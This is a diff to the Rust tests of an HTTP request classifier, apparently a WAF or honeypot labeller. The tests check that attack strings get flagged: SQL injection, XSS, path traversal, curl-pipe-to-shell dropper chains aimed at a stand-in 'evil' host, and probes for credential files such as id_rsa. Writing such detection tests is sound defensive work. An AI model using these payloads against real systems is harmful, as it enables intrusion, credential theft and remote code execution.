@@ -875,12 +875,18 @@ mod tests {
             "Wfuzz/3.1.0",
             "dirb",
             "httpx - Open-source project (github.com/projectdiscovery/httpx)",
+        ] {
+            let l = labels_of(&c, "GET", "/", &[("user-agent", ua)], None);
+            assert!(l.iter().any(|x| x == "scanner-ua"), "{ua}: {l:?}");
+        }
+        // Research scanners carry their own label since the scanners split.
+        for ua in [
             "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
             "Expanse, a Palo Alto Networks company, searches across the global IPv4 space",
             "l9explore/1.2.2",
         ] {
             let l = labels_of(&c, "GET", "/", &[("user-agent", ua)], None);
-            assert!(l.iter().any(|x| x == "scanner-ua"), "{ua}: {l:?}");
+            assert!(l.iter().any(|x| x == "research-scanner"), "{ua}: {l:?}");
         }
         for ua in [
             "python-httpx/0.27.0",
@@ -1049,5 +1055,157 @@ mod tests {
         bomb.write_all(&vec![b'a'; 4 * 1024 * 1024]).unwrap();
         let bomb = bomb.finish().unwrap();
         assert_eq!(decoded_body(&h, &bomb).len() as u64, MAX_DECODED_BODY);
+    }
+
+    #[test]
+    fn sqli_additions_are_caught() {
+        for q in [
+            "id=1;waitfor%20delay%20'0:0:5'",
+            "id=1%20or%20pg_sleep(5)--",
+            "id=1%20union%20select%20load_file('/etc/passwd')",
+            "id=1;exec%20xp_cmdshell%20'whoami'",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/item", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(v.labels.iter().any(|l| l == "sqli"), "{q}: {:?}", v.labels);
+        }
+    }
+
+    #[test]
+    fn xss_additions_are_caught() {
+        for q in [
+            "q=<svg/onload=alert(1)>",
+            "q=%3Cimg%20src=x%20onerror=alert(1)%3E",
+            "q=<iframe%20src=//evil>",
+            "q=alert(document.cookie)",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/search", Some(q), "Mozilla/5.0", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(v.labels.iter().any(|l| l == "xss"), "{q}: {:?}", v.labels);
+        }
+    }
+
+    #[test]
+    fn traversal_additions_are_caught() {
+        for q in [
+            "f=..;/..;/etc/passwd",
+            "f=php://filter/convert.base64-encode/resource=index.php",
+            "f=/etc/shadow",
+            "f=/proc/version",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/x", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "path-traversal"),
+                "{q}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn rce_dropper_chain_in_query_is_caught() {
+        for q in [
+            "u=a;wget%20http://evil/x",
+            "u=a;curl%20http://evil/x|sh",
+            "u=a;busybox%20wget%20http://evil",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/ping", Some(q), "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(v.labels.iter().any(|l| l == "rce"), "{q}: {:?}", v.labels);
+        }
+    }
+
+    #[test]
+    fn backup_and_debug_paths_are_sensitive() {
+        for p in [
+            "/backup.sql",
+            "/www.zip",
+            "/app_dev.php",
+            "/_profiler/",
+            "/elmah.axd",
+            "/debug/vars",
+            "/web.config",
+            "/composer.json",
+            "/terraform.tfstate",
+            "/id_rsa",
+            "/.kube/config",
+        ] {
+            let v = classifier().classify(
+                &view("GET", p, None, "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "sensitive-path"),
+                "{p}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn iot_probe_additions_are_caught() {
+        for p in [
+            "/picsdesc.xml",
+            "/ctrlt/DeviceUpgrade_1",
+            "/setup.cgi?next_file=netgear.cfg",
+            "/JNAP/",
+            "/SDK/webLanguage",
+            "/doc/page/login.asp",
+            "/RPC2_Login",
+        ] {
+            let v = classifier().classify(
+                &view("GET", p, None, "curl/8", None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "iot-probe"),
+                "{p}: {:?}",
+                v.labels
+            );
+        }
+    }
+
+    #[test]
+    fn research_scanner_uas_get_their_own_label() {
+        for ua in [
+            "CensysInspect/1.1",
+            "Expanse, a Palo Alto Networks company",
+            "Mozilla/5.0 (compatible; shadowserver)",
+            "binaryedge-bot",
+            "stretchoid",
+        ] {
+            let v = classifier().classify(
+                &view("GET", "/", None, ua, None),
+                &hist(1, 1),
+                &BotTells::default(),
+            );
+            assert!(
+                v.labels.iter().any(|l| l == "research-scanner"),
+                "{ua}: {:?}",
+                v.labels
+            );
+        }
+        let v = classifier().classify(
+            &view("GET", "/", None, "sqlmap/1.7", None),
+            &hist(1, 1),
+            &BotTells::default(),
+        );
+        assert!(v.labels.contains(&"scanner-ua".to_string()));
+        assert!(!v.labels.contains(&"research-scanner".to_string()));
     }
 }
